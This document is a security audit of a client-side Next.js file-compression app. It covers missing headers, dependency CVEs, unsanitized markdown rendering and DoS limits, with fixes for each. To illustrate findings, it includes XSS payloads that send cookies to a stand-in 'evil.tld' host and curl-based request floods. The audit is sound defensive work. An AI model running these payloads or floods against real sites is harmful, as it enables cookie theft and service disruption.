# FormReady — Pre-Production Security Audit

**Date:** 2026-05-11
**Auditor:** Senior application-security review
**Scope:** Full codebase pre-deployment audit (front-end attack surface, file-handling pipeline, dependency security, deployment hardening, OWASP Top 10).
**Build under review:** Next.js 14.2.35 production build, exit 0, 40 routes, 89.9 KB shared First Load JS.

---

## 1. Executive Summary

### Overall security posture: **B+ (strong, with hardening required before public launch)**

FormReady's architecture is its biggest security asset. The application is **100% client-side** — there is no backend, no upload endpoint, no authentication, no database, and no `fetch()` calls in application code. This eliminates 80% of the attack surface of a typical web app:

- ✅ No SQL injection possible (no database query layer)
- ✅ No SSRF possible (no server-side network egress)
- ✅ No IDOR / mass assignment / broken authorization (no auth, no user objects)
- ✅ No file-upload endpoint to exploit (files never traverse the network)
- ✅ No path traversal possible on the server (no server-side file I/O on user-supplied data)
- ✅ No JWT / session / replay-attack surface (no sessions)
- ✅ No GraphQL / API abuse surface (no APIs)

The remaining attack surface is:
1. **Production HTTP response hardening** (missing security headers — fixable in 30 minutes)
2. **Third-party dependency CVEs** (one high-severity Next.js DoS class — fixable by upgrade)
3. **Client-side DoS via crafted files** (high-page-count PDFs, slow-decode images — needs caps)
4. **A latent XSS path** in the blog pipeline that is currently inert (only repo-write authors can publish) but becomes critical the moment user-submitted content reaches it
5. **A small set of low-severity hygiene issues** (cookie flags, blob-URL lifecycle, debug routes)

### Production readiness score

| Dimension | Score | Notes |
|---|---|---|
| Architecture | 9.5 / 10 | Client-side-only design is the right call |
| Code quality | 8 / 10 | Generally tight; a few hygiene issues |
| Dependency safety | 6 / 10 | Several CVEs from transitive deps and Next.js itself |
| Response hardening | 3 / 10 | No security headers configured |
| File handling | 7 / 10 | Size limit present; page-count limit missing |
| **Overall** | **7.5 / 10** | **Hardening required — NOT yet safe to deploy** |

### Critical observations

1. **Zero `dangerouslySetInnerHTML` instances render user-controlled input today.** Of the 18 occurrences, 17 render `JSON.stringify` of static schema.org JSON-LD objects (safe). The 18th renders `marked()`-parsed blog HTML, but the markdown source lives in the repo under `content/blog/` — only authors with Git push access can introduce content. This means **no XSS is currently exploitable**, but the blog pipeline is one feature-request away from becoming a critical hole (e.g., the day someone adds blog comments or user submissions).

2. **There is no Content Security Policy.** This is the single biggest hardening gap. CSP would make several theoretical attack classes (residual XSS, clickjacking via framing, exfiltration via third-party domains) impossible regardless of code-level vulnerabilities.

3. **`npm audit` reports 5 advisories against Next.js 14.2.18.** All are server-side DoS classes; none are immediately exploitable in this app's configuration, but they will be flagged by any post-launch security scanner. Recommended fix: upgrade to Next.js 15.5.15+ before public launch.

4. **PDF processing has no page-count limit.** A 50 MB PDF with 10,000 pages will rasterize all 10,000 pages and freeze the user's browser tab. This is a self-inflicted DoS (the attacker is also the victim), but it's a vector for griefing on shared kiosk devices and a poor failure mode.

---

## 2. Vulnerability Findings

Severity scale: **Critical** (immediate exploit) · **High** (significant risk, must fix pre-launch) · **Medium** (real risk, fix before scaling traffic) · **Low** (hygiene / defense-in-depth).

---

### H-1 · Missing HTTP security headers (CSP, HSTS, X-Frame-Options, Referrer-Policy, Permissions-Policy)

| Field | Value |
|---|---|
| Severity | **High** |
| File | `next.config.mjs` |
| OWASP | A05:2021 — Security Misconfiguration |
| CWE | CWE-693 (Protection Mechanism Failure), CWE-1021 (Improper Restriction of Rendered UI Layers) |

**Description.**
`next.config.mjs` does not export a `headers()` function. As a result, none of the standard response-hardening headers are set on any route. Specifically missing:

- `Content-Security-Policy` — no XSS / data-exfiltration protection
- `Strict-Transport-Security` (HSTS) — no protocol-downgrade protection
- `X-Frame-Options` / `frame-ancestors` — site can be framed by attackers (clickjacking)
- `Referrer-Policy` — full referer URL leaks to outbound links (Plausible, fonts)
- `Permissions-Policy` — browser features (geolocation, camera, microphone) are not explicitly denied
- `X-Content-Type-Options: nosniff` — relies on Vercel default (it is set, but should be explicit)

**Exploitation scenario.**
1. **Clickjacking the upload flow.** Without `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'`, an attacker can embed FormReady inside an iframe on `attacker.tld`, overlay a transparent button, and trick a user into uploading their Aadhaar PDF "into" what they believe is FormReady but is actually a phishing capture. (Mitigated in this app because the file genuinely never leaves the browser — but the user-experience attack remains: they trust the FormReady UI inside the iframe and may believe an attacker-page is FormReady.)
2. **Residual XSS amplification.** Any future XSS (e.g., via a future blog comments feature) becomes maximum-impact because there is no CSP `script-src` allowlist to block injected scripts.
3. **Mixed-content + downgrade.** Without HSTS, the first visit over HTTP can be intercepted to deliver an HTTP-to-HTTPS-stripping proxy.

**Root cause.**
Next.js 14 does not set CSP, HSTS, or `X-Frame-Options` by default. They must be opted into via `next.config.mjs`. The project has shipped with the defaults.

**Proof-of-concept.**
```bash
curl -I https://<preview-url>/compress-pdf
# Response contains:
#   x-powered-by  (already stripped by poweredByHeader:false ✓)
# Missing:
#   Content-Security-Policy
#   Strict-Transport-Security
#   X-Frame-Options
#   Referrer-Policy
#   Permissions-Policy
```

**Recommended fix.**
Add the following to `next.config.mjs`:

```js
const securityHeaders = [
  // HSTS — once domain stable; preload after 6 months of clean HTTPS.
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains',
  },
  // Clickjacking
  { key: 'X-Frame-Options', value: 'DENY' },
  // MIME sniffing
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  // Referer leakage
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  // Feature denial — we don't use camera/mic/geolocation
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=(), interest-cohort=()',
  },
  // CSP — strict default. Adjusted because:
  //   - Plausible loads from plausible.io (script-src + connect-src)
  //   - Google Fonts loads from fonts.googleapis.com + fonts.gstatic.com
  //   - PDF worker is same-origin
  //   - 'wasm-unsafe-eval' required for pdfjs + libheif-js WASM
  //   - 'unsafe-inline' for styles is required by Next.js's <style jsx>
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'wasm-unsafe-eval' https://plausible.io",
      "connect-src 'self' https://plausible.io",
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
      "font-src 'self' https://fonts.gstatic.com",
      "img-src 'self' data: blob:",
      "worker-src 'self' blob:",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "object-src 'none'",
      "upgrade-insecure-requests",
    ].join('; '),
  },
]

const nextConfig = {
  // ...existing config
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }]
  },
}
```

**Verify after deploy.**
```bash
curl -sI https://formready.in/ | grep -iE "content-security-policy|strict-transport|x-frame|referrer-policy|permissions-policy"
# All five should be present.
```

Then run https://securityheaders.com/?q=formready.in — should score **A or A+**.

---

### H-2 · Next.js 14.2.18 — 5 active DoS-class CVEs

| Field | Value |
|---|---|
| Severity | **High** |
| File | `package.json` (`"next": "^14.2.18"`) |
| OWASP | A06:2021 — Vulnerable and Outdated Components |
| CWE | CWE-400 (Resource Exhaustion), CWE-444 (HTTP Request Smuggling), CWE-502 (Deserialization), CWE-770 (Allocation w/o Limits) |

**Description.**
`npm audit` reports five advisories against the pinned Next.js version:

| Advisory | Severity | CVE Class |
|---|---|---|
| [GHSA-9g9p-9gw9-jx7f](https://github.com/advisories/GHSA-9g9p-9gw9-jx7f) | Moderate | Image Optimizer DoS via remotePatterns |
| [GHSA-h25m-26qc-wcjf](https://github.com/advisories/GHSA-h25m-26qc-wcjf) | **High (7.5)** | RSC HTTP deserialization DoS |
| [GHSA-ggv3-7p47-pfv8](https://github.com/advisories/GHSA-ggv3-7p47-pfv8) | Moderate | Rewrites HTTP request smuggling |
| [GHSA-3x4c-7xq6-9pq8](https://github.com/advisories/GHSA-3x4c-7xq6-9pq8) | Moderate | next/image cache disk exhaustion |
| [GHSA-q4gf-8mx6-v5v3](https://github.com/advisories/GHSA-q4gf-8mx6-v5v3) | **High (7.5)** | Server Components DoS |

**Applicability to this codebase:**
- The Image Optimizer CVE: **N/A** — no `remotePatterns` configured, and `next/image` is used only for static local assets (so the disk-cache CVE also only matters during traffic spikes).
- The RSC deserialization + Server Components DoS: **applicable in principle** — the app uses React Server Components on every page. The exploit requires malformed RSC payloads from a client; on Vercel, the platform layer absorbs most of it, but on self-hosted `next start` it's a direct DoS vector.
- HTTP smuggling via rewrites: **N/A** — `next.config.mjs` has no `rewrites()` configuration.

**Exploitation scenario (on self-hosted node).**
An attacker scripts `for i in {1..1000}; do curl -H "RSC: 1" -H "Next-Router-State-Tree: $(garbage)" https://formready.in/compress-pdf & done` and exhausts memory on the Next.js server.

**Recommended fix.**
Upgrade Next.js to the latest 15.x.

```bash
npm install next@^15.5.15 eslint-config-next@^15.5.15
npm run build
npm run typecheck
```

Note: Next.js 15 introduces a few breaking changes (async `cookies()`/`headers()`, Server Actions API tweaks). Smoke-test all 40 routes after upgrade. The `metadata` API and App Router structure are stable.

**Until upgraded:** if deploying to Vercel, the platform's edge layer mitigates most of these. If deploying to self-hosted node, add a reverse proxy (nginx / Cloudflare) with request-size limits and concurrent-connection caps in front.

---

### H-3 · `@ducanh2912/next-pwa` ships a high-severity transitive (`serialize-javascript` via `@rollup/plugin-terser`)

| Field | Value |
|---|---|
| Severity | **High** (build-time only — see notes) |
| File | `package.json` (`"@ducanh2912/next-pwa": "^10.2.9"`) |
| OWASP | A06:2021 — Vulnerable and Outdated Components |
| CWE | CWE-1395 (Dependency on Vulnerable Third-Party Component) |

**Description.**
`npm audit` flags `@rollup/plugin-terser` (transitive through `workbox-build`) for [GHSA against `serialize-javascript`](https://github.com/advisories) — XSS via reviver function when deserialising untrusted JSON.

**Applicability.**
`workbox-build` runs **at build time only** to generate the precache manifest in `public/sw.js`. It never executes on user devices. The transitive vulnerability would only be exploitable if an attacker could inject malicious JSON into the workbox build pipeline — which requires write access to `node_modules` or the build server. **Practical risk: very low.**

However, `npm audit` will continue to flag this on every `npm install` in CI, which is noisy and trains the team to ignore audit output. Also, supply-chain attacks against workbox have happened (real precedent), so it's worth resolving.

**Recommended fix.**
Pin `@ducanh2912/next-pwa` to `10.2.6` (one minor version below current) per `npm audit fix`'s suggestion:

```bash
npm install @ducanh2912/next-pwa@10.2.6 --save-exact
```

Verify the PWA build still emits `public/sw.js` after pinning. If 10.2.6 breaks PWA behavior, the alternative is to migrate to `next-pwa` (the original Hsu fork) at v5.6.0, which has a cleaner workbox dependency tree.

---

### M-1 · `marked` v18 output rendered via `dangerouslySetInnerHTML` without sanitization

| Field | Value |
|---|---|
| Severity | **Medium** (Critical if user-submitted content ever reaches this pipeline) |
| File | `src/components/blog/article-prose.tsx`, `src/lib/blog/index.ts:122` |
| OWASP | A03:2021 — Injection |
| CWE | CWE-79 (Cross-Site Scripting) |

**Description.**
`marked` v7+ removed its built-in `sanitize` option. The current code does:

```ts
const html = await marked.parse(parsed.content, { renderer, async: true })
// ...later in article-prose.tsx:
<div dangerouslySetInnerHTML={{ __html: html }} />
```

There is no DOMPurify, no `sanitize-html`, no allowlist between `marked.parse()` and the DOM.

A malicious markdown file containing:
```markdown
Hello <img src=x onerror="fetch('https://evil.tld/exfil?'+document.cookie)">
```

…would render as `<img src=x onerror="...">` and execute the payload in the user's browser.

**Why it's not currently exploitable.**
Blog markdown lives in `content/blog/*.md` in the Git repository. To introduce a malicious payload, an attacker would need to push a commit, which requires repository write access. The MVP has no UGC pipeline — comments, submissions, edits — that would let an outsider write to this rendering path.

**Why it's still Medium, not Low.**
The pipeline is one feature-flag away from becoming Critical:
- If you ever add blog comments → critical XSS
- If you ever let users submit guest posts → critical XSS
- If you ever import third-party markdown (e.g., a Medium RSS importer) → critical XSS
- If an attacker compromises a contributor's GitHub account → critical XSS

Defense-in-depth says: sanitize at the render boundary, not at the source. The repo-write-only trust boundary is fragile.

**Exploitation scenario (theoretical, requires repo write access today).**
1. Attacker compromises a contributor's GitHub account.
2. Pushes `content/blog/innocent-looking-post.md` with `<script>fetch('https://evil/?c=' + document.cookie)</script>` (or `<img onerror>` since marked passes `<script>` through too).
3. CI builds + deploys.
4. Every visitor to `/blog/innocent-looking-post` runs the script under the formready.in origin — can read cookies, locale, future session tokens, can mount any subsequent UI.

**Recommended fix.**
Add DOMPurify to the rendering pipeline:

```bash
npm install isomorphic-dompurify
```

Then in `src/lib/blog/index.ts`:

```ts
import DOMPurify from 'isomorphic-dompurify'

// ...inside parseMarkdown:
const rawHtml = await marked.parse(parsed.content, { renderer, async: true })
const html = typeof rawHtml === 'string'
  ? DOMPurify.sanitize(rawHtml, {
      // Allow the markdown features we actually use; deny everything else.
      ALLOWED_TAGS: ['h1','h2','h3','h4','p','a','strong','em','code','pre',
                     'ul','ol','li','blockquote','hr','br','img','table',
                     'thead','tbody','tr','th','td','del','figure','figcaption'],
      ALLOWED_ATTR: ['href','title','alt','src','id','class','start'],
      // No event handlers, no javascript: URIs.
      FORBID_ATTR: ['onerror','onload','onclick','onmouseover','style'],
      FORBID_TAGS: ['script','style','iframe','object','embed','form','input'],
    })
  : ''
```

Add a unit test that asserts `<script>` and `<img onerror>` are stripped:

```ts
// __tests__/blog/sanitize.test.ts
import { describe, it, expect } from 'vitest'
import { parseMarkdown } from '@/lib/blog'

describe('blog sanitization', () => {
  it('strips <script> from markdown', async () => {
    const post = await parseMarkdown('# t\npublishedAt: 2026-01-01\ncategory: how-to\n---\n<script>alert(1)</script>', 'x')
    expect(post.html).not.toMatch(/<script/i)
  })
  it('strips onerror handlers', async () => {
    const post = await parseMarkdown('<img src=x onerror=alert(1)>', 'x')
    expect(post.html).not.toMatch(/onerror/i)
  })
})
```

---

### M-2 · Dynamic routes `[slug]` and `blog/[slug]` allow unbounded server rendering on unknown paths

| Field | Value |
|---|---|
| Severity | **Medium** |
| File | `src/app/[slug]/page.tsx`, `src/app/blog/[slug]/page.tsx` |
| OWASP | A05:2021 — Security Misconfiguration |
| CWE | CWE-770 (Allocation of Resources Without Limits) |

**Description.**
Both dynamic-segment routes export `generateStaticParams()` (10 slugs and 3 blog slugs respectively) but **do not export `dynamicParams: false`**. Per Next.js App Router defaults, this means requests for unlisted slugs are rendered on-demand at the server, hitting the database (in this case, a filesystem read for blog) on every miss.

```ts
// src/app/[slug]/page.tsx — current
export async function generateStaticParams() {
  return allLandingSlugs().map((slug) => ({ slug }))
}

export default function LandingPage({ params }: PageProps) {
  const page = findLandingPage(params.slug)
  if (!page) notFound()
  // ...
}
```

A request to `/random-string-12345` triggers SSR of `notFound()`. Each miss is a server compute cycle + a cache entry. Vercel automatically caches the `404` for ~60s, but an attacker varying the slug (`/a1`, `/a2`, …, `/zzzzz`) can force fresh renders.

**Exploitation scenario.**
```bash
# 100k unique slug requests → 100k SSR cycles
seq 1 100000 | xargs -P 50 -I{} curl -s -o /dev/null https://formready.in/abc-{}-test
```

On Vercel: the function may not OOM but you'll burn through serverless minutes and the bill. On self-hosted: the node process can run out of memory under sustained load.

**Recommended fix.**
Lock both dynamic routes to known-only:

```ts
// src/app/[slug]/page.tsx
export const dynamicParams = false  // ← add this

export async function generateStaticParams() {
  return allLandingSlugs().map((slug) => ({ slug }))
}
```

```ts
// src/app/blog/[slug]/page.tsx
export const dynamicParams = false  // ← add this

export async function generateStaticParams() {
  const slugs = await getAllSlugs()
  return slugs.map((slug) => ({ slug }))
}
```

With `dynamicParams = false`, unknown slugs return a static `404` from the CDN — zero server compute. This is exactly what we want since these slugs are fully known at build time.

**Verify after deploy.**
```bash
curl -sI https://formready.in/known-slug      # 200
curl -sI https://formready.in/random-12345    # 404 from CDN, no server hit
```

---

### M-3 · PDF processing has no page-count limit — high-page-count file freezes browser

| Field | Value |
|---|---|
| Severity | **Medium** |
| File | `src/lib/compression/pdf.ts:147`, `src/lib/compression/pdf-to-image.ts:101` |
| OWASP | A05:2021 — Security Misconfiguration |
| CWE | CWE-400 (Uncontrolled Resource Consumption) |

**Description.**
`FileDropZone` enforces a 50 MB file-size cap, but neither PDF processing path enforces a page-count cap. The compression engine iterates `for (let i = 1; i <= pageCount; i++)` (effectively, through `rasterizeAtTier`), where `pageCount = doc.numPages` from pdfjs. A specially-crafted 50 MB PDF can legally contain tens of thousands of nearly-empty pages.

**Exploitation scenario.**
1. Attacker generates `bomb.pdf` with 50,000 empty pages, ~45 MB total. Passes the 50 MB filter.
2. User (or attacker on a kiosk) drops it into the compressor.
3. Engine attempts to rasterize page 1 → page 50,000 across the tier ladder.
4. Browser tab consumes 100% CPU and several GB of RAM, eventually crashing.

This is "self-DoS" (the attacker hurts themselves) — but it's also a vector for:
- **Kiosk griefing** at exam centers / cybercafés
- **PWA-installed devices** where the tab crash takes down the installed app
- **Honest users** uploading legitimately large PDFs (e.g., 500-page property-deed scans) get a worse experience than they should

**Recommended fix.**
Add explicit page-count caps and surface a clear error:

```ts
// src/lib/compression/pdf.ts
const MAX_PAGES = 200  // tune based on real-world distribution

export async function compressPdf(file: File, options: CompressionOptions) {
  // ...existing buffer load...
  const doc = await pdfjs.getDocument({ data: buffer }).promise
  const pageCount = doc.numPages

  if (pageCount > MAX_PAGES) {
    await doc.destroy()
    throw new Error(
      `This PDF has ${pageCount} pages. The browser can only compress up to ${MAX_PAGES} pages reliably. ` +
      `Try splitting the PDF first.`,
    )
  }
  // ...existing rasterization...
}
```

Mirror the same check in `pdf-to-image.ts`.

Surface the error in the UI:

```ts
// src/components/tools/compress-pdf-tool.tsx — inside the catch block
catch (err) {
  const message = (err as Error).message
  if (message.includes('pages')) {
    toast.error(message, { duration: 8000 })
  } else {
    toast.error('Could not compress this PDF. It may be corrupt or password-protected.')
  }
  setState({ kind: 'idle' })
}
```

For belt-and-braces: also surface a count check **before** rasterization by previewing the page count and showing "127 pages — proceed?" if > 50.

---

### M-4 · Blob-URL memory leak in image compression tool

| Field | Value |
|---|---|
| Severity | **Medium** |
| File | `src/components/tools/compress-image-tool.tsx:302` |
| OWASP | A05:2021 — Security Misconfiguration (resource exhaustion class) |
| CWE | CWE-401 (Missing Release of Memory after Effective Lifetime) |

**Description.**
Line 302:
```tsx
<img src={URL.createObjectURL(state.file)} alt="Original" />
```

`URL.createObjectURL` is called inside JSX, which means it runs on **every render**. Each call allocates a new blob URL referencing the underlying `File`. The previous blob URLs are **never revoked** because the reference is lost between renders.

Over a long session with several compressions, blob URLs accumulate. Each holds a reference to a (potentially multi-MB) `File`, preventing garbage collection. A user who compresses 50 images in one session can leak 200–500 MB of memory.

**Exploitation scenario.**
A user keeps the tab open all day on a school/exam-day kiosk and processes form documents repeatedly. Eventually the tab OOMs and Chrome's renderer crashes. The user loses their work-in-progress and trust in the tool.

This is not malicious — but it's a security/reliability concern flagged because:
- It's deterministic, easy to trigger
- It silently degrades a privacy-claimed product

**Recommended fix.**
Hoist the blob URL into a `useMemo` with cleanup:

```tsx
// at component top
const originalUrl = React.useMemo(
  () => (state.file ? URL.createObjectURL(state.file) : null),
  [state.file],
)
React.useEffect(() => {
  return () => {
    if (originalUrl) URL.revokeObjectURL(originalUrl)
  }
}, [originalUrl])

// in JSX
{originalUrl && <img src={originalUrl} alt="Original" />}
```

Audit the rest of the components for the same pattern:

```bash
grep -rn "src={URL\.createObjectURL" src/components
```

Currently only the one site shows the bug, but adding a lint rule (`no-direct-blob-url-in-jsx` via a small custom ESLint rule) would prevent regressions.

---

### M-5 · File-type validation relies on the `accept` attribute (trivially bypassable)

| Field | Value |
|---|---|
| Severity | **Medium** (defense-in-depth, low practical impact) |
| File | `src/components/tools/file-drop-zone.tsx` |
| OWASP | A04:2021 — Insecure Design |
| CWE | CWE-434 (Unrestricted Upload of File with Dangerous Type) |

**Description.**
`FileDropZone` validates files via the HTML `accept` attribute:
```tsx
<input type="file" accept="application/pdf,image/*" />
```

And a `file.size > maxBytes` check. There is **no MIME sniffing, no magic-byte verification, no extension allowlist**. The `accept` attribute is a UI filter only — browsers do not enforce it on drag-and-drop, and developer tools can bypass the file-picker dialog entirely.

A user can drop `payload.exe` (renamed `payload.pdf`), or a polyglot PDF/HTML file that triggers different parsers in different contexts.

**Why the practical impact is low.**
- The file never leaves the browser — there is no server to be compromised.
- pdfjs/pdf-lib throw on malformed input — the engine fails closed.
- The output is a re-encoded PDF/JPEG, so polyglot tricks don't survive.

**Why it's still Medium.**
- A crafted file can crash the pdfjs worker → user sees a generic error → erodes trust.
- A malformed image can OOM the canvas decode (e.g., pixel-flood attacks) → browser hang.
- It's a missing defense-in-depth layer that costs ~20 LOC.

**Recommended fix.**
Add magic-byte sniffing in `file-drop-zone.tsx`:

```ts
const MAGIC_BYTES = {
  pdf:  [[0x25, 0x50, 0x44, 0x46]],                              // %PDF
  jpg:  [[0xff, 0xd8, 0xff]],
  png:  [[0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]],
  webp: [[0x52, 0x49, 0x46, 0x46]],                              // RIFF (verify VP8 later)
  heic: [[0x66, 0x74, 0x79, 0x70, 0x68, 0x65, 0x69, 0x63]],      // ftypheic at offset 4
}

async function detectFileType(file: File): Promise<keyof typeof MAGIC_BYTES | null> {
  const head = new Uint8Array(await file.slice(0, 16).arrayBuffer())
  for (const [type, signatures] of Object.entries(MAGIC_BYTES)) {
    for (const sig of signatures) {
      const offset = type === 'heic' ? 4 : 0
      if (sig.every((b, i) => head[offset + i] === b)) {
        return type as keyof typeof MAGIC_BYTES
      }
    }
  }
  return null
}

const handleFiles = async (files: FileList | null) => {
  if (!files || files.length === 0) return
  const file = files[0]
  if (file.size > maxBytes) {
    setInternalState('error')
    return
  }
  const detectedType = await detectFileType(file)
  if (!detectedType) {
    setInternalState('error')
    toast.error('This file type isn\'t supported. Try PDF, JPG, PNG, WebP, or HEIC.')
    return
  }
  setInternalState('active')
  onFileSelected?.(file)
}
```

This adds ~30ms of read overhead on a tiny slice, and gives users a precise error instead of a confusing pdfjs stack trace.

---

### L-1 · Cookies lack the `Secure` flag

| Field | Value |
|---|---|
| Severity | **Low** |
| File | `src/components/brand/lang-toggle.tsx:19`, `src/components/layout/cookie-banner.tsx:19` |
| OWASP | A05:2021 — Security Misconfiguration |
| CWE | CWE-614 (Sensitive Cookie Without 'Secure' Attribute) |

**Description.**
Both cookies set by the app:
```ts
document.cookie = `NEXT_LOCALE=${next}; path=/; max-age=...; samesite=lax`
document.cookie = `${COOKIE_NAME}=${COOKIE_VALUE_ACK}; path=/; max-age=...; samesite=lax`
```
…have `SameSite=Lax` but **lack the `Secure` flag**. Neither cookie carries sensitive data (locale preference, banner-dismissal flag), so direct impact is nil. But it's a best-practice miss that security scanners (Mozilla Observatory, SecurityHeaders.com) will flag.

**Recommended fix.**
```ts
// Append "; Secure" if running over HTTPS (i.e., everywhere except localhost)
const secureFlag = location.protocol === 'https:' ? '; Secure' : ''
document.cookie = `NEXT_LOCALE=${next}; path=/; max-age=...; samesite=lax${secureFlag}`
```

(Once HSTS is added per H-1, the `Secure` flag becomes purely belt-and-braces — but security scanners check both.)

---

### L-2 · `/design-system` route is publicly accessible in production

| Field | Value |
|---|---|
| Severity | **Low** |
| File | `src/app/design-system/page.tsx` |
| OWASP | A05:2021 — Security Misconfiguration |
| CWE | CWE-540 (Inclusion of Sensitive Information in Source Code) |

**Description.**
The `/design-system` route renders the internal component library / token reference. It exposes:
- Brand color tokens with semantic naming
- All button variants and states
- File-drop-zone in test modes (`active`, `success`, `error`, `error-toobig`)
- Internal labels like "Verified Locally", trust strip
- Component construction details that aid social engineering

It's listed in `robots.txt` disallow but that's a hint to crawlers, not enforcement — anyone who knows the URL can view it.

**Risk.**
- An attacker browsing `/design-system` learns FormReady's exact look-and-feel, internal copy patterns, and component construction. Lowers the bar for phishing-page replicas.
- The page is built and shipped in the production bundle — small JS footprint cost.

**Recommended fix.**

Option A (simplest — disable in production):
```ts
// src/app/design-system/page.tsx
import { notFound } from 'next/navigation'

export default function DesignSystemPage() {
  if (process.env.NODE_ENV === 'production') notFound()
  // ...existing render
}
```

Option B (gate behind env var so it's available on previews):
```ts
if (!process.env.NEXT_PUBLIC_SHOW_DESIGN_SYSTEM) notFound()
```

Set `NEXT_PUBLIC_SHOW_DESIGN_SYSTEM=1` on Vercel preview environments only.

Verify after deploy:
```bash
curl -sI https://formready.in/design-system    # 404
curl -sI https://preview.formready.in/design-system  # 200 (if option B)
```

---

### L-3 · `accept` attribute can be bypassed via drag-and-drop

Subsumed by **M-5**. Stand-alone: simply note that drag-and-drop ignores the `accept` filter entirely, so anything beyond `accept="application/pdf"` requires programmatic verification. Fix is included in M-5.

---

### L-4 · `postcss` moderate DoS via transitive (build-time only)

| Field | Value |
|---|---|
| Severity | **Low** (build-time only) |
| File | `package-lock.json` (transitive via `tailwindcss`) |
| OWASP | A06:2021 — Vulnerable and Outdated Components |
| CWE | CWE-1395 |

**Description.**
`npm audit` flags `postcss` for a moderate DoS class. Postcss runs at build time only, never on user devices. Practical risk: nil (would require an attacker to inject malicious CSS into the build pipeline, which requires write access to the repo).

**Recommended fix.**
Allow `npm audit fix` to bump postcss minor versions. Will resolve automatically when Next.js is upgraded (H-2) since Next 15 pulls a newer postcss.

---

### L-5 · `next-intl` v3 CVEs (NOT EXPLOITABLE — informational only)

| Field | Value |
|---|---|
| Severity | **Informational** |
| File | `package.json` (`"next-intl": "^3.26.0"`) |
| Verified | Confirmed non-exploitable by manual code review |

`npm audit` flags two `next-intl` v3.x CVEs:
1. **GHSA-8f24-v5vv-gm5j** — open-redirect via `redirect` helper.
2. **GHSA-4c35-wcg5-mm9h** — prototype pollution via `experimental.messages.precompile`.

**Verification.**
```bash
grep -rn "redirect.*from 'next-intl\|next-intl.*redirect\|experimental.messages.precompile" src
# Returns: nothing
```

This codebase uses next-intl only for:
- `getRequestConfig` (negotiates locale from cookie/header — safe substring match)
- `useTranslations` / `getTranslations`
- `NextIntlClientProvider`

None of the affected APIs are touched. **Both CVEs are non-exploitable in the current code.** However, upgrade to next-intl v4+ is recommended for future-proofing, alongside the Next.js 15 upgrade (H-2) — next-intl v4 is built for Next 15.

---

## 3. Verified Safe / Positive Findings

Findings worth recording as **confirmed secure** rather than gaps:

| # | Item | Why it's secure |
|---|---|---|
| ✓1 | No API routes / no server actions | `find src -name "route.ts"` and `grep "'use server'"` both return empty. Architecture-first privacy verified at code level. |
| ✓2 | No `fetch()` / no `XMLHttpRequest` in app code | `grep "fetch("` returns zero hits in `src/`. The only network egress is the Plausible script (env-gated, third-party CDN). |
| ✓3 | All `dangerouslySetInnerHTML` in pages render `JSON.stringify(staticObject)` for JSON-LD | 17 of 18 instances pattern: `__html: JSON.stringify({ '@context': 'https://schema.org', ... })`. No user data flows in. |
| ✓4 | No `eval()`, no `new Function()`, no `document.write` | `grep -E '\beval\s*\(\|new Function\s*\('` returns zero hits. |
| ✓5 | No `innerHTML` / `outerHTML` assignment outside React | Zero hits. |
| ✓6 | No source maps in production | `next.config.mjs` does not set `productionBrowserSourceMaps: true`; Next defaults to false. |
| ✓7 | No `localStorage` usage at all | Only `sessionStorage` for the browser-compat banner dismissal flag — non-sensitive. |
| ✓8 | Both cookies use `SameSite=Lax` | Mitigates CSRF (though no CSRF surface exists since no APIs). |
| ✓9 | `poweredByHeader: false` in next.config | `X-Powered-By` not leaked. |
| ✓10 | Compression engines accept `AbortSignal` | User cancellation works, preventing zombie computation. |
| ✓11 | Image-to-PDF queue capped at 20 files | DoS-class protection in place. |
| ✓12 | File size capped at 50 MB | DoS-class protection in place (page count missing — see M-3). |
| ✓13 | PWA service worker scope = `/` with proper precache | No off-origin caching, no opaque-response abuse. Workbox config explicitly excludes `pdf.worker.min.mjs` from precache (good — keeps initial PWA payload light). |
| ✓14 | Plausible analytics is env-gated | `NEXT_PUBLIC_PLAUSIBLE_DOMAIN` unset → no script loads → no analytics requests. Privacy-respecting failure mode. |
| ✓15 | `next-intl` locale negotiation uses substring matching, not header reflection | `acceptLang.toLowerCase().includes('hi')` — no header-injection risk. |
| ✓16 | `notFound()` used correctly on missing slugs | The mechanism is correct; M-2 is about caching, not security. |
| ✓17 | `JSZip` used only for *creating* ZIPs (not parsing user-supplied) | No decompression-bomb risk — we never `loadAsync` user input. |
| ✓18 | `pdfjs-dist` v4.10.38 has no known CVEs at this pinned version | Latest 4.x release. v5 has `import.meta` incompatibilities that broke the build (documented in code comments). |
| ✓19 | `pdf-lib` v1.17.1 has no known CVEs | Unmaintained but secure at this version. |
| ✓20 | No `process.env` leakage to client | The three `process.env.NEXT_PUBLIC_*` references are intentionally public. No secrets in code. |
| ✓21 | No `.env` files in the repo | Confirmed `.env*` only appears in `.gitignore` patterns. |
| ✓22 | Edge-runtime icon/OG routes take no user input | `/icon`, `/apple-icon`, `/opengraph-image` render a fixed payload. No DoS amplification via query params. |
| ✓23 | The libheif-js dynamic-require warning is webpack-suppressed correctly | The dynamic code path only runs in Node, never in browser bundle. |
| ✓24 | Cookie banner is purely informational | No tracking before consent because there's nothing to consent to (cookieless analytics). |

---

## 4. Production Deployment Risks (Immediate Blockers)

Before pointing DNS to production:

| # | Item | Status | Effort |
|---|---|---|---|
| **B1** | Add CSP, HSTS, X-Frame-Options, Referrer-Policy, Permissions-Policy headers (H-1) | **Blocking** | 30 min |
| **B2** | Add `dynamicParams = false` to both dynamic routes (M-2) | **Blocking** | 5 min |
| **B3** | Add page-count cap (M-3) | **Blocking** | 15 min |
| **B4** | Hide `/design-system` in production (L-2) | Strongly recommended | 5 min |
| **B5** | Upgrade Next.js 14.2.18 → 15.5.15+ (H-2) | Strongly recommended | 1–2 hrs (incl. smoke test) |
| **B6** | Pin or upgrade `@ducanh2912/next-pwa` (H-3) | Strongly recommended | 30 min |
| **B7** | Add DOMPurify to blog rendering (M-1) | Strongly recommended | 30 min |
| **B8** | Fix blob-URL leak in compress-image-tool (M-4) | Recommended | 15 min |
